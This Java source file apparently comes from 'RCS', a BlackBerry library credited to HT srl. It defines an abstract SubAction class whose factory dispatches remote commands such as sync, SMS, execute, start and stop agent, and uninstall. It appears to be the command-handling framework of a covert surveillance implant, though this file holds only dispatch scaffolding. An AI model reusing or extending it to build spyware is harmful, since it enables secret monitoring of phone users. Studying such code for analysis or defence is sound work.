//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SubAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction implements Runnable {
	//#ifdef DEBUG
	protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
	//#endif

	public static final int ACTION = 0x4000;
	public static final int ACTION_SYNC = ACTION + 0x1;
	public static final int ACTION_UNINSTALL = ACTION + 0x2;
	public static final int ACTION_RELOAD = ACTION + 0x3;
	public static final int ACTION_SMS = ACTION + 0x4;
	public static final int ACTION_TOOTHING = ACTION + 0x5;
	public static final int ACTION_START_AGENT = ACTION + 0x6;
	public static final int ACTION_STOP_AGENT = ACTION + 0x7;
	public static final int ACTION_SYNC_PDA = ACTION + 0x8;
	public static final int ACTION_EXECUTE = ACTION + 0x9;
	public static final int ACTION_SYNC_APN = ACTION + 0xa;
	public static final int ACTION_LOG = ACTION + 0xb;

	public int actionId;

	protected boolean wantUninstall;

	protected boolean wantReload;

	protected Status status;

	/**
	 * Factory.
	 * 
	 * @param actionId_
	 *            the action id_
	 * @param confParams
	 *            the conf params
	 * @return the sub action
	 */
	public static SubAction factory(final int actionId_, final byte[] confParams) {
		switch (actionId_) {
		case ACTION_SYNC:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_SYNC ***");
			//#endif
			return new SyncAction(actionId_, confParams);
		case ACTION_UNINSTALL:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_UNINSTALL ***");
			//#endif
			return new UninstallAction(actionId_, confParams);
		case ACTION_RELOAD:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_RELOAD ***");
			//#endif
			return new ReloadAction(actionId_, confParams);
		case ACTION_SMS:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_SMS ***");
			//#endif
			return new SmsAction(actionId_, confParams);
		case ACTION_TOOTHING:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_TOOTHING ***");
			//#endif
			return new ToothingAction(actionId_, confParams);
		case ACTION_START_AGENT:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_START_AGENT ***");
			//#endif
			return new StartAgentAction(actionId_, confParams);
		case ACTION_STOP_AGENT:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_STOP_AGENT ***");
			//#endif
			return new StopAgentAction(actionId_, confParams);
		case ACTION_SYNC_PDA:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_SYNC_PDA ***");
			//#endif
			return new SyncPdaAction(actionId_, confParams);
		case ACTION_EXECUTE:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_EXECUTE ***");
			//#endif
			return new ExecuteAction(actionId_, confParams);
		case ACTION_SYNC_APN:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_SYNC ***");
			//#endif
			return new SyncActionApn(actionId_, confParams);
		case ACTION_LOG:
			//#ifdef DEBUG_TRACE
			debug.trace("Factory *** ACTION_INFO ***");
			//#endif
			return new LogAction(actionId_, confParams);
		default:
			return null;
		}
	}

	/**
	 * Instantiates a new sub action.
	 * 
	 * @param actionId_
	 *            the action id_
	 */
	protected SubAction(final int actionId_) {
		status = Status.getInstance();
		actionId = actionId_;
	}

	/**
	 * Execute.
	 * 
	 * @param event
	 *            the event
	 * @return true, if successful
	 */
	public abstract boolean execute(Event event);

	private Event triggeringEvent;
	private boolean finished;

	public void prepareExecute(final Event triggeringEvent) {
		this.triggeringEvent = triggeringEvent;
	}
	
	public boolean isFinished(){
		return finished;
	}

	public void run() {
		finished = false;
		execute(triggeringEvent);
		synchronized (this) {
			notify();
			finished = true;
		}

	}

	/**
	 * Parses the.
	 * 
	 * @param confParams
	 *            the conf params
	 * @return true, if successful
	 */
	protected abstract boolean parse(byte[] confParams);

	/*
	 * (non-Javadoc)
	 * @see java.lang.Object#toString()
	 */
	public String toString() {
		return "" + actionId;
	}

	/**
	 * Want reload.
	 * 
	 * @return true, if successful
	 */
	public final boolean wantReload() {
		return wantReload;
	}

	/**
	 * Want uninstall.
	 * 
	 * @return true, if successful
	 */
	public final boolean wantUninstall() {
		return wantUninstall;
	}

}
